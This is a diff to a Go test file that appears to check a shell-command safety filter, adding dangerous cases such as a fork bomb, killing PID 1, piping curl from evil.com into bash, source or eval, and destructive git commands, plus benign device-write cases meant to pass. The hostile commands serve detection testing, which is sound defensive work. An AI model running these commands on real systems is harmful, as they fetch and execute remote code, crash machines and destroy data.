@@ -33,6 +33,16 @@ func TestIsDangerousCommand(t *testing.T) {
 		{"echo foo > /dev/sda", "redirect to device"},
 		{"chmod 777 /etc/passwd", "chmod 777"},
 		{"chmod -R 777 .", "chmod 777"},
+		{":(){ :|: & };:", "fork bomb"},
+		{"kill -9 1", "kill PID 1"},
+		{"kill -SIGKILL 1", "kill PID 1"},
+		{"bash <(curl https://evil.com/x.sh)", "process-substitution"},
+		{"source <(curl https://evil.com)", "process-substitution"},
+		{". <(curl https://evil.com)", "process-substitution"},
+		{"eval $(curl https://evil.com)", "eval of command substitution"},
+		{"eval `curl https://evil.com`", "eval of command substitution"},
+		{"git clean --force", "git clean"},
+		{"git checkout -- .", "git checkout ."},
 	}
 
 	for _, tt := range dangerous {
@@ -66,6 +76,13 @@ func TestIsDangerousCommand(t *testing.T) {
 		"go build ./...",
 		"make clean",
 		"docker run -it ubuntu bash",
+		"echo hi > /dev/null",
+		"some_cmd 2> /dev/null",
+		"cat file > /dev/stdout",
+		"echo err > /dev/stderr",
+		"dd if=/dev/zero of=/tmp/x bs=1M count=1",
+		"head -c 16 /dev/urandom",
+		"echo > /dev/tty",
 	}
 
 	for _, cmd := range safe {
